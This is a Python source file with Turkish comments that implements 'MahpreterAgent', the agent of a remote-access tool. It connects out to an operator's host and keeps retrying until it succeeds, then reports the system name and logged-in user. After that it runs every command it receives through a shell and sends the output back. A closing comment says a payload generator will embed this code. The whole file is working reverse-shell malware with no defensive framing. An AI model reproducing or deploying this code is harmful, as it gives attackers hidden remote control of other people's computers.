import socket
import subprocess
import os
import sys
import platform
import struct
import time

class MahpreterAgent:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None

    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port))
                # Bağlantı kurulunca sistem bilgisini gönder
                self.send_sysinfo()
                return
            except:
                time.sleep(5)

    def send_sysinfo(self):
        try:
            uname = platform.uname()
            info = f"{uname.system} {uname.release} ({os.getlogin()})"
            self.send_data(info)
        except:
            self.send_data("Unknown System")

    def run(self):
        self.connect()
        while True:
            try:
                data = self.recv_data()
                if not data:
                    break
                
                output = self.execute_command(data)
                self.send_data(output)
            except Exception as e:
                pass
                # Bağlantı koparsa yeniden bağlanmayı deneyebilir
                # self.connect() 

    def execute_command(self, cmd):
        if cmd == "terminate":
            sys.exit(0)
        
        try:
            # Komut çalıştırma
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = proc.communicate()
            return (stdout + stderr).decode('utf-8', errors='ignore')
        except Exception as e:
            return str(e)

    def send_data(self, data):
        if not self.sock: return
        # Veriyi length-prefixed olarak gönder (Protocol: [Len 4 bytes][Data])
        encoded = data.encode('utf-8')
        length = struct.pack('!I', len(encoded))
        self.sock.sendall(length + encoded)

    def recv_data(self):
        if not self.sock: return None
        # Önce uzunluğu oku
        len_data = self.sock.recv(4)
        if not len_data: return None
        length = struct.unpack('!I', len_data)[0]
        
        # Datayı oku
        data = b''
        while len(data) < length:
            chunk = self.sock.recv(length - len(data))
            if not chunk: return None
            data += chunk
        return data.decode('utf-8')

# Payload içine gömülecek kısım burası, ancak bu dosya referans.
# Gerçek payload generate.py tarafından üretilecek ve bu kodu içerecek.
